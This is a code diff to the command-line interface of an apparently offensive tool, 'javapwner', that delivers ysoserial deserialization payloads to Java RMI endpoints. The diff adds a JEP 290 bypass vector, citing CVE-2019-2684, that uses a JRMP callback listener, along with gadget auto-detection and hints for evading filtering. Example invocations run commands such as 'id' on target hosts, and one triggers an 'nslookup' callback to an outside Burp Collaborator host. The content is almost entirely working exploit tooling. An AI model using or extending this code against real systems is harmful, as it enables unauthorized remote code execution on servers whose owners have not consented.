@@ -263,6 +263,11 @@ def _display_scan_results(fmt: OutputFormatter, target: str, results: list) -> N
 @click.option("--via", type=click.Choice(["dgc", "registry", "jep290-bypass"]),
               default="dgc", show_default=True,
               help="Delivery vector: 'dgc' (always available), 'registry', or 'jep290-bypass' (JRMP listener).")
+@click.option("--listener-host", default=None, metavar="IP",
+              help="Local IP the target connects back to (jep290-bypass). "
+                   "Auto-detected from routing table when omitted.")
+@click.option("--listener-port", default=8888, show_default=True, type=int, metavar="PORT",
+              help="Local port for the JRMP callback listener (jep290-bypass).")
 @click.pass_context
 def exploit_cmd(
     ctx: click.Context,
@@ -271,6 +276,8 @@ def exploit_cmd(
     gadget: str | None,
     command: str,
     via: str,
+    listener_host: str | None,
+    listener_port: int,
 ) -> None:
     """Deliver a ysoserial payload to a Java RMI endpoint.
 
@@ -279,13 +286,20 @@ def exploit_cmd(
 
     \b
     Delivery vectors:
-      --via dgc       DGC dirty() call — works on any JRMP endpoint (default)
-      --via registry  Registry bind() — requires unauthenticated bind access
+      --via dgc           DGC dirty() call — works on any JRMP endpoint (default)
+                          Blocked by JEP 290 on Java >= 8u121.
+      --via registry      Registry bind() — requires unauthenticated bind access
+      --via jep290-bypass UnicastRef + JRMP listener (CVE-2019-2684).
+                          Works on Java 8u131–8u241 / 11.0.0–11.0.5.
+                          Requires the target to reach --listener-host:--listener-port.
 
     \b
     Examples:
       javapwner rmi exploit -t 10.0.0.5 -p 1099 --gadget CommonsCollections6 --cmd 'id'
       javapwner rmi exploit -t 10.0.0.5 -p 8282 --cmd 'id'   (auto-detect gadget)
+      javapwner rmi exploit -t 10.0.0.5 -p 1099 --gadget CommonsCollections5 \\
+          --cmd 'nslookup x.burpcollaborator.net' --via jep290-bypass \\
+          --listener-host 192.168.1.10 --listener-port 8888
     """
     fmt = _get_fmt(ctx)
     timeout = _get_timeout(ctx)
@@ -297,12 +311,21 @@ def exploit_cmd(
         fmt.error(str(exc))
         sys.exit(1)
 
+    if via == "jep290-bypass":
+        fmt.info(
+            f"JEP290 bypass mode: starting JRMP listener on "
+            f"{listener_host or '<auto>'}:{listener_port}"
+        )
+
     # ---- Auto-detect gadget when none specified ----
     if gadget is None:
         fmt.info(f"No gadget specified — probing compatible gadgets on {target}:{port}…")
         with fmt.status("Detecting gadgets…"):
             try:
-                compatible, result = exploiter.auto_exploit(target, port, command, via=via)
+                compatible, result = exploiter.auto_exploit(
+                    target, port, command, via=via,
+                    listener_host=listener_host, listener_port=listener_port,
+                )
             except JavaPwnerError as exc:
                 fmt.error(str(exc))
                 sys.exit(1)
@@ -311,7 +334,7 @@ def exploit_cmd(
             fmt.error(
                 "No compatible gadgets found on the target.\n"
                 "  Possible reasons:\n"
-                "  • JEP 290 is active (try --via jep290-bypass)\n"
+                "  • JEP 290 is active — try --via jep290-bypass\n"
                 "  • None of the tested libraries are on the target's classpath\n"
                 "  • ysoserial.jar not found (set YSOSERIAL_PATH)"
             )
@@ -323,7 +346,10 @@ def exploit_cmd(
         # ---- Explicit gadget ----
         fmt.info(f"Exploiting {target}:{port} via {via} with gadget '{gadget}' → {command!r}")
         try:
-            result = exploiter.exploit(target, port, gadget, command, via=via)
+            result = exploiter.exploit(
+                target, port, gadget, command, via=via,
+                listener_host=listener_host, listener_port=listener_port,
+            )
         except JavaPwnerError as exc:
             fmt.error(str(exc))
             sys.exit(1)
@@ -338,15 +364,21 @@ def exploit_cmd(
 
     used = result.gadget_used or gadget or "unknown"
     if result.likely_success:
-        fmt.success(f"[{used}] Payload delivered — no exception in response (likely executed).")
+        fmt.success(f"[{used}] Payload delivered — likely executed.")
     elif result.exception_in_response:
-        fmt.warning(f"[{used}] TC_EXCEPTION in response — payload may have been filtered (JEP 290?).")
+        fmt.warning(f"[{used}] TC_EXCEPTION in response — JEP 290 may be filtering the gadget.")
+        fmt.info("  Hint: run 'javapwner rmi scan -G' to detect compatible gadgets,")
+        fmt.info("        or try --via jep290-bypass (requires Java 8u131–8u241 / 11.0.0–11.0.5).")
+        if result.response_bytes:
+            # Show first 64 bytes of the server response as hex for diagnosis
+            snippet = result.response_bytes[:64]
+            fmt.info(f"  Server response (hex): {snippet.hex(' ')}")
     elif result.sent:
-        fmt.info(f"[{used}] Payload sent — no response received (blind execution).")
+        fmt.info(f"[{used}] Payload sent — no response (possible blind execution or JEP 290 drop).")
     else:
         fmt.error("Payload was not sent.")
 
-    if fmt.verbose:
+    if fmt.verbose and result.response_bytes:
         fmt.print_hex_dump(result.response_bytes, label="Server response")
 
 
